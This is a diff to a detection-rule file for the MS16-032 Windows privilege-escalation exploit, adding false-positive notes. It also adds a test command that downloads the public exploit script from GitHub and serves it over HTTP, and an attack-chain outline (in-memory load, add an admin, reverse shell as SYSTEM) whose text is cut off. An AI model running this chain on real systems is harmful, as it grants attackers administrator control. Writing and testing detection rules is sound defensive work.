@@ -127,7 +127,8 @@
           "T1068"
         ],
         "fidelity": "signature",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management"
       },
       {
         "platform": "splunk",
@@ -141,7 +142,8 @@
         "confidence": "medium",
         "log_ids": [
           "4104"
-        ]
+        ],
+        "false_positives": "Admin scripts using the same cmdlets for legitimate management tasks"
       },
       {
         "platform": "splunk",
@@ -156,7 +158,8 @@
         "log_ids": [
           "4720",
           "4732"
-        ]
+        ],
+        "false_positives": "HR onboarding processes, automated account provisioning"
       },
       {
         "platform": "sigma",
@@ -167,7 +170,8 @@
           "T1068"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "sigma",
@@ -178,7 +182,8 @@
           "T1068"
         ],
         "fidelity": "behavioral",
-        "confidence": "medium"
+        "confidence": "medium",
+        "false_positives": "Legitimate admin activity using the same Windows APIs or tools"
       },
       {
         "platform": "elastic",
@@ -188,7 +193,9 @@
         "attack": [
           "T1068"
         ],
-        "fidelity": "signature"
+        "fidelity": "signature",
+        "false_positives": "Admin scripts using similar cmdlets for legitimate system management",
+        "confidence": "high"
       }
     ],
     "visibility": {
@@ -239,7 +246,9 @@
         "Review PowerShell Script Block / Module Logs, Windows Security Event Log for surrounding context (5 min before/after)",
         "Verify whether the activity matches known administrative baselines or change windows",
         "If confirmed malicious, isolate the host and escalate to incident response"
-      ]
+      ],
+      "test_command": "wget https://raw.githubusercontent.com/FuzzySecurity/PowerShell-Suite/master/Invoke-MS16-032.ps1; python3 -m http.server 80"
     }
-  }
+  },
+  "explain": "End-to-end MS16-032 chain: stage the exploit on your host, pull it into memory on target (no disk write), run it to add an administrator, then verify - the full context, in order.\nKey sections:\n  1. Host the exploit (attacker/Kali)\n  2. Load in memory (target)\n  3. Run - add local admin (target)\n  4. Verify (target)\n  5. Alt: reverse shell as SYSTEM\n=== Attack Chain: MS16-032 Secondary Logon  SYSTEM ===\nFull chain using MS16-032 race condition in Secondary Logon service for privilege escalation.\n\n=== CHAIN OVERVIEW ===\nFoothold (any low-priv ..."
 }
